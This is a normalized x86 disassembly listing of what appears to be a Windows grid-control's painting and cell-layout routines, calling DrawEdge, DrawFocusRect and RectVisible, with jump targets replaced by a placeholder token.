mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0xc ]
je r-xdata
test bl bl
jne r-xdata
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_465000
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_465000
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_465000
pop ecx
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_465000
pop ecx
jmp r-xdata
sub_465278
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x1c ]
add ebx 0xfffffffc
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x29 ] eax
jmp r-xdata
mov eax [ ebp - 0x29 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2d ] eax
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
call sub_468c80
add eax [ ebp - 0x29 ]
mov [ ebp - 0x21 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add eax [ ebp - 0x21 ]
mov [ ebp - 0x29 ] eax
inc [ ebp - 0xc ]
mov eax [ ebx ]
cmp edi [ eax + 0x21c ]
jl r-xdata
mov eax [ ebx ]
mov edx edi
call sub_468c60
add eax [ ebp - 0x2d ]
mov [ ebp - 0x25 ] eax
mov eax [ ebp - 0x25 ]
cmp eax [ ebp - 0x2d ]
jle r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add eax [ ebp - 0x25 ]
mov [ ebp - 0x2d ] eax
inc edi
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d780
push eax
call RectVisible
test eax eax
je r-xdata
mov al [ ebp + 0x8 ]
mov [ ebp - 0xd ] al
mov eax [ ebx ]
call sub_464a8c
test al al
je r-xdata
mov eax [ ebp + 0x1c ]
lea ecx [ eax - 0x80 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4637c0
test al al
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
test [ ebp - 0xd ] 0x2
je r-xdata
or [ ebp - 0xd ] 0x1
mov eax [ ebx ]
cmp edi [ eax + 0x228 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x4
je r-xdata
or [ ebp - 0xd ] 0x2
mov eax [ ebx ]
mov esi [ eax + 0x208 ]
mov eax [ ebx ]
mov edx [ eax + 0x68 ]
mov eax esi
call sub_41d67c
test [ ebp - 0xd ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_41cf14
test [ ebp - 0xd ] 0x2
je r-xdata
lea eax [ ebp - 0x2d ]
push eax
mov al [ ebp - 0xd ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
test [ ebp - 0xd ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov edx 0xff00000d
call sub_41cf14
mov eax [ esi + 0xc ]
mov edx 0xff00000e
call sub_41c728
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
lea edx [ ebp - 0x2d ]
mov eax esi
call sub_41d2ec
test [ ebp - 0xd ] 0x2
je r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
mov edx [ ebp + 0x1c ]
or eax [ edx - 0x88 ]
je r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x3d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x4
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x8
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add [ ebp - 0x35 ] eax
jmp r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d780
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x88 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d780
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add [ ebp - 0x31 ] eax
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x1d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d780
push eax
call DrawFocusRect
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d780
push eax
call DrawFocusRect
jmp r-xdata
sub_4655ae
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
lea edi [ ebp - 0x70 ]
mov eax [ ebx ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d75c
mov edx edi
mov eax [ ebx ]
call sub_465bec
cmp [ edi ] 0x0
jg r-xdata
mov dl 0x1
mov eax [ ebx ]
call sub_4660d8
mov esi 0xc0c0c0
mov eax [ ebx ]
mov edx [ edi + 0x40 ]
sub edx [ eax + 0x25c ]
mov eax [ ebx ]
add edx [ eax + 0x23c ]
mov eax [ ebx ]
push [ eax + 0x258 ]
mov eax [ edi + 0x10 ]
pop ecx
sub eax ecx
mov ecx [ ebx ]
add eax [ ecx + 0x238 ]
call sub_423a38
add eax 0x3
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
shl eax 0x3
add eax eax
call sub_464fb8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_464fb8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx 0x2
mov edx [ ebp - 0xc ]
call sub_464fac
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
call sub_41c268
cmp eax 0xc0c0c0
jne r-xdata
cmp [ edi + 0x30 ] 0x0
jle r-xdata
push ebp
push 0x0
xor eax eax
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_4651e8
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_4651e8
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
xor eax eax
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_4651e8
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push esi
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x4
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x8
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_4651e8
pop ecx
mov eax [ ebp - 0x10 ]
call sub_464fe8
mov eax [ ebp - 0x8 ]
call sub_464fe8
mov esi 0x808080
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
call sub_468ca0
xor eax eax
mov [ ebp - 0x84 ] eax
xor eax eax
mov [ ebp - 0x88 ] eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
je r-xdata
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x88 ] 0x1
push ebp
push 0x0
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_465278
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x34 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
xor edx edx
call sub_465278
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
xor ecx ecx
xor eax eax
call sub_465278
pop ecx
push ebp
mov eax [ edi + 0x34 ]
push eax
mov eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
call sub_465278
pop ecx
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
or [ ebp - 0x84 ] 0x8
or [ ebp - 0x88 ] 0x2
mov eax [ edi + 0x8 ]
cmp eax [ edi + 0xc ]
jge r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
je r-xdata
mov eax [ edi + 0x38 ]
cmp eax [ edi + 0x3c ]
jge r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41cf14
mov eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
xor edx edx
mov eax [ edi + 0x8 ]
call sub_412640
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d2ec
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41cf14
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x38 ]
xor eax eax
call sub_412640
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d2ec
mov eax [ ebx ]
mov si 0xffb5
call sub_40348c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov eax [ ebx ]
call sub_4660d8
push 0x0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
call sub_468ca0
lea edx [ ebp - 0xc8 ]
lea ecx [ ebp - 0xb8 ]
mov eax [ ebx ]
call sub_466a14
mov eax [ ebx ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
push edi
lea esi [ ebp - 0xb8 ]
lea edi [ ebp - 0xa8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d780
push eax
call DrawFocusRect
lea edx [ ebp - 0xb8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d2b8
jmp r-xdata
sub_465aa8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp esi [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x20 ]
dec edx
mov [ ebp - 0xc ] esi
xor eax eax
mov edx [ ebx + 0x18 ]
dec edx
xor ecx ecx
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] 0xffffffff
mov esi eax
sub edx esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_465b10
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db50
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov esi [ ebx + 0x1c ]
mov edi [ ebx + 0x20 ]
dec edi
mov [ ebp - 0xc ] eax
xor esi esi
mov edi [ ebx + 0x18 ]
dec edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db50
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] 0xffffffff
sub edi esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_465b90
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
push ebp
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_465b10
pop ecx
mov [ edi ] eax
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_465aa8
mov [ edi ] eax
jmp r-xdata
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_465aa8
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_465bec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43db94
push eax
mov eax ebx
call sub_43db50
mov ecx eax
mov edx esi
mov eax ebx
call sub_465c70
pop esi
pop ebx
retn
sub_465c10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x10 ] eax
mov esi [ ebx + 0x1c ]
mov eax [ ebx + 0x20 ]
dec eax
sub eax esi
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x10 ] esi
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x14 ] eax
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov edx eax
add edx [ ebx ]
cmp edx [ ebx + 0x8 ]
jge r-xdata
sub_465c70
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx ebx
call sub_465d2c
mov eax ebx
mov edx esi
call sub_465c10
lea eax [ ebx + 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_465c10
pop esi
pop ebx
pop ebp
retn 0x4
sub_465c9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x2 ] dx
mov ebx eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x248 ]
and ax [ ebp - 0x2 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x244 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
inc esi
xor edi edi
xor eax eax
mov [ ebx + 0x4 ] eax
mov esi [ ebp - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add eax [ ebx ]
add [ ebx + 0x4 ] eax
inc edi
dec esi
jne r-xdata
sub_465d2c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_468c60
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x238 ]
mov eax ebx
mov dx [ r-xdata ]
call sub_465c9c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_468c80
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x23c ]
lea eax [ ebx + 0x30 ]
mov dx [ r-xdata ]
call sub_465c9c
pop ecx
pop ebx
pop ecx
pop ebp
retn
sub_465db0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0xc ]
add eax [ ebx ]
mov [ ebp - 0xc ] eax
mov esi [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
sub eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ ebp - 0x10 ] eax
dec esi
inc [ ebp - 0x10 ]
jne r-xdata
sub [ ebp - 0xc ] eax
mov eax [ ebx ]
sub [ ebp - 0xc ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jle r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jg r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
sub_465e24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov edx [ ebx ]
mov eax esi
call sub_465db0
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
lea eax [ esi + 0x30 ]
call sub_465db0
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_465e54
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ ebp - 0x5 ] 0x3
jne r-xdata
mov ebx [ edi + 0x4 ]
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
xor edx edx
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x14 ] 0x7
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
je r-xdata
mov eax [ edi + 0x1c ]
mov edx [ edi + 0x20 ]
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x14 ] 0x7
mov edx [ ebp - 0x14 ]
sub edx eax
shr edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db50
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
cmp eax [ edi + 0x8 ]
jne r-xdata
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx eax
sub edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
cmp eax [ ebp - 0x4 ]
jl r-xdata
add ebx [ edi ]
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
add eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
mov [ edx ] eax
mov eax [ edi + 0xc ]
sub eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
mov [ edx ] eax
mov eax [ edi + 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov eax [ edi + 0x2c ]
call [ edi + 0x28 ]
add ebx eax
cmp ebx [ edi + 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov [ eax ] ebx
sub ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
sub_465f6c
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db50
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setg al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setg al
pop esi
pop ebp
retn
sub_465fb8
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db50
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setge al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setge al
pop esi
pop ebp
retn
sub_466004
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov bx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax ebx
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x290 ]
or ax bx
mov ebx eax
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
call sub_43db94
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_43db50
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_465f6c
pop ecx
test al al
